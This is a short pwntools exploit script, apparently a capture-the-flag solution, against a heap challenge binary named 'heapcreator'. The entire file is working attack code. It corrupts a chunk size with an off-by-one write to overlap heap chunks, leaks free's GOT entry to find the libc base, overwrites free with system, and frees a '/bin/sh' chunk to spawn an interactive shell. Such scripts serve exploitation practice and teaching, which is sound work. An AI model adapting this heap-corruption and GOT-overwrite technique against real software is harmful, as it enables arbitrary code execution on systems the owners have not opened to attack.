from pwn import *
r = process("./heapcreator")
elf = ELF("./heapcreator")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)


def edit(idx, content):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(content)


def show(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))


def delete(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))
    
free_got = elf.got["free"]
create(0x18,"a")
create(0x10,"a")
edit(0,"/bin/sh\00"+p64(0)*2+"\x41")
delete(1)
create(0x30,p64(0)*4+p64(0x31)+p64(free_got))
show(1)
r.recvuntil("Content : ")
free_plt = u64(r.recvuntil("Done").split("\n")[0].ljust(8,"\x00"))
libc_base = free_plt - libc.symbols["free"]
sys_addr = libc_base + libc.symbols["system"]
log.success("sys addr "+hex(sys_addr))
edit(1,p64(sys_addr))
delete(0)
r.interactive()
